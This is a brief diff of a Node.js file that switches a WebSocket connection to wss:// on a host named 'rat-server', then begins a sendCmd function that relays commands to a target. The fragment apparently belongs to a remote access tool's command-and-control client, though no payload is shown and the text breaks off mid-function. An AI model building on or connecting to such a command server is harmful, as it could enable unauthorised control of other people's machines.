@@ -1,5 +1,5 @@
 const WebSocket = require("ws")
-const ws = new WebSocket("ws://rat-server-n24e.onrender.com")
+const ws = new WebSocket("wss://rat-server-n24e.onrender.com")
 
 async function sendCmd(cmd,target,uuid,data, role){
     ws.send(JSON.stringify({
